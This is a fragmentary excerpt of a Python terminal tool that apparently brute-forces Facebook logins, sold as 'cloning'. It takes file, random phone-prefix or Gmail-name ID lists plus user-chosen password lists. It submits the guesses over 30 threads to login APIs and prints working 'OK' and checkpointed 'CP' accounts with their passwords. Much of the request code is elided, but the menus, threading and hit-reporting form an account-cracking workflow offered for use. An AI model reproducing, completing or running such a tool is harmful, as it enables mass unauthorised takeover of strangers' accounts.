...
try:
	...
	print('git pull --quiet 2>/dev/null')
...
def menu():
			clear()
		#	linex()
			print('\033[1;33m[\033[1;31m1\033[1;33m]\033[1;37mFile cloning\n\033[1;33m[\033[1;31m2\033[1;33m]\033[1;37mRandom cloning\n\033[1;33m[\033[1;31m3\033[1;33m]\033[1;37mGmail cloning \n\033[1;33m[\033[1;31m4\033[1;33m]\033[1;37mContact by owner \n\033[1;33m[\033[1;31m0\033[1;33m]\033[1;37mExit menu')
			linex()
			xd=input(' Choose an option: ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' \033[1;32mPut file example:  /sdcard/File.txt  etc..\033[1;37m')
				linex()
				file = input(' \033[1;33mPut file path\033[1;37m: ')
				try:
					...
					menu()
				clear()
				print(' \033[1;32mAll method working\033[1;37m ')
				linex()
				print(' \033[1;35m[1] \033[1;36mMethod \n\033[1;35m [2] \033[1;36mMethod  \n\033[1;35m [3]\033[1;36m Method \n\033[1;35m [4]\033[1;36m Method  ')
				linex()
				mthd=input(' \033[1;34mChoose:\033[1;37m')
				linex()
				plist = []
				try:
					ps_limit = int(input(' \033[1;33mHow many passwords do you want to add ? \033[1;37m'))
				except:
					ps_limit =1
				clear()
				...
				clear()
				print(' \033[1;35mDo you went show cp account? (y/n): \033[1;37m')
				linex()
				cx=input(' Choose: ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print('\033[1;35mTotal account ids : \033[1;32m'+total_ids+f' ')
				...
				print('\033[1;37m')
				linex()
				print('\033[1;33mThe process has completed\033[1;37m')
				print('Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input('\033[1;31mPress enter to back\033[1;37m ')
...
def pak():
		user=[]
		clear()
		print('\033[1;33m Code example: \033[1;32m0306,0315,0335,0345')
		code = input('\033[1;33m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;35m [1] \033[1;36mMethod  \033[1;35m \n [2] \033[1;36mMethod  \033[1;35m \n [3] \033[1;36mMethod  \033[1;35m \n [4] \033[1;36mMethod(🍪) ')
		linex()
		mthd = input(' Choose: ')
		clear()
		print('\033[1;32m [1] \033[1;35mV-fast \n\033[1;32m [2] \033[1;35mBest \n\033[1;32m [3] \033[1;35mfast \n\033[1;32m [4] \033[1;35mslow-best ')
		linex()
		pcs = input(' [?] Select: ')
		...
		with tred(max_workers=30) as KPK:	
			clear()
			tl = str(len(user))
			print(' \033[1;35mTotal ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;35m Choice code  :\033[1;32m '+code)
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					KPK.submit(kpk1,ids,passlist)
				if mthd in ['2','02']:
					KPK.submit(kpk2,ids,passlist)
				if mthd in ['3','03']:
					KPK.submit(kpk3,ids,passlist)
				if mthd in ['4','04']:
					KPK.submit(kpk4,ids,passlist)
				if mthd in ['5','05']:
					KPK.submit(kpk5,ids,passlist)
				if mthd in ['6','06']:
					KPK.submit(kpk6,ids,passlist)
		print('\033[1;37m')
		linex()
...
def gmail():
		...
		clear()
		print('\033[1;37m example: rehan, ali, sahil, faizan\033[1;97m')
		linex()
		...
		with tred(max_workers=30) as KPK:
			total = str(len(fo))
			clear()
			print(' \033[1;35mTotal ids : \033[1;32m'+total+f' ')
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;31m [\033[1;33mKPK-M1\033[1;31m] \033[1;37m%s|\033[1;32mOK<×>%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\033[1;31m [KPK-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;31m [\033[1;33mKPK-M2\033[1;31m] \033[1;37m%s|\033[1;32mOK<×>%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;31m [\033[1;33mKPK-M3\033[1;31m] \033[1;37m%s|\033[1;32mOK<×>%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;31m [\033[1;33mKPK-M4\033[1;31m] \033[1;37m%s|\033[1;32mOK<×>%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;31m [KPK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
